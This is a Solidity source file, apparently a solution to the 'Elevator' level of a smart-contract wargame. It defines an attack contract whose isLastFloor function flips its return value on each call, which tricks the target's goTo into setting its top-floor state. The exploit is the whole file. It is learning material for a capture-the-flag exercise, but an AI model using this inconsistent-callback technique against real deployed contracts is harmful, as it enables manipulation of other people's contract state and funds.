// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./11-elevator.sol";

contract Attack11 {
    bool public toggle = true;
    Elevator public target;

    constructor(address _targetAddress) {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }
}
